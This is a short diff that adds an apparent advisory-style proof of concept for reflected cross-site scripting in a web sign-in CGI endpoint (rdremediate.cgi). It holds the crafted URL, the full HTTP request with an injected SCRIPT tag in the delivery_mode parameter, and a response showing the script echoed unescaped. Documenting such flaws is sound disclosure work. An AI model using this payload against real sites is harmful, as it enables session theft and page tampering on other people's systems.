@@ -1,0 +1,24 @@
+https://www.example.com/dana-na/auth/rdremediate.cgi?delivery_mode=&lt;/APPLET&gt;&lt;SCRIPT&gt;alert(&#039;Can%20Cross%20Site%20Attack&#039;)&lt;/SCRIPT&gt;&amp;action=tryagain&amp;signinId=url_default
+
+COMPLETE HTTP REQUEST:
+
+GET
+/dana-na/auth/rdremediate.cgi?delivery_mode=&lt;/APPLET&gt;&lt;SCRIPT&gt;alert(&#039;Can%20Cross%20Site%20Attack&#039;)&lt;/SCRIPT&gt;&amp;action=tryagain&amp;signinId=url_default
+HTTP/1.1
+User-Agent: curl/7.15.4 (i486-pc-linux-gnu) libcurl/7.15.4
+OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.3
+Host: target-domain.foo
+Accept: */*
+[CRLF]
+[CRLF]
+
+
+PARTIAL HTTP RESPONSE:
+
+&lt;title&gt;&lt;/title&gt;
+
+[SNIP]
+
+&lt;APPLET id=NeoterisSetup &gt; Unknown deliver mode
+&lt;/APPLET&gt;&lt;SCRIPT&gt;alert(&#039;Can Cross Site Attack&#039;)&lt;/SCRIPT&gt;
+&lt;PARAM NAME=&quot;Parameter0&quot; VALUE=&quot;action=tryagain&quot;&gt;&lt;/APPLET&gt;
